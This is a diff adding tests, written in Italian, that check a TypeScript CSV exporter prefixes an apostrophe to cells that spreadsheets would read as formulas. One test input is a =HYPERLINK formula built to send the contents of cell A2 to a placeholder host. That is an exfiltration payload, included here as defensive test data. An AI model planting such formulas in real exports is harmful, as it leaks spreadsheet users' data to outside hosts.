@@ -51,4 +51,30 @@ describe("toCsv", () => {
     it("senza righe scrive solo l'intestazione", () => {
         expect(toCsv<Row>([], columns)).toBe("﻿ID,Nome,Attivo,Note,Creato il\r\n");
     });
+    describe("testi che un foglio di calcolo leggerebbe come formula", () => {
+        const noteColumn = [{ header: "Note", value: (row: { note: string | number | null }) => row.note }];
+        const cellOf = (note: string | number | null) => toCsv([{ note }], noteColumn).split("\r\n")[1];
+
+        it.each(["=1+1", "+39 333 1234567", "-2+3", "@SUM(A1)", "\tcmd", "\r=1+1"])(
+            "antepone un apostrofo a %j",
+            (note) => {
+                expect(cellOf(note).replace(/^"|"$/g, "")).toMatch(/^'/);
+            }
+        );
+
+        it("neutralizza anche un campo che va tra virgolette", () => {
+            expect(cellOf('=HYPERLINK("http://x.example/?d="&A2,"clic")')).toBe(
+                '"\'=HYPERLINK(""http://x.example/?d=""&A2,""clic"")"'
+            );
+        });
+
+        it.each(["-5.00", "+12", "42", "3.5"])("lascia intatto il numero scritto come testo %j", (note) => {
+            expect(cellOf(note)).toBe(note);
+        });
+
+        it("lascia intatti i numeri veri e i testi che non iniziano con un carattere di formula", () => {
+            expect(cellOf(-5)).toBe("-5");
+            expect(cellOf("Mario = Rossi")).toBe("Mario = Rossi");
+        });
+    });
 });
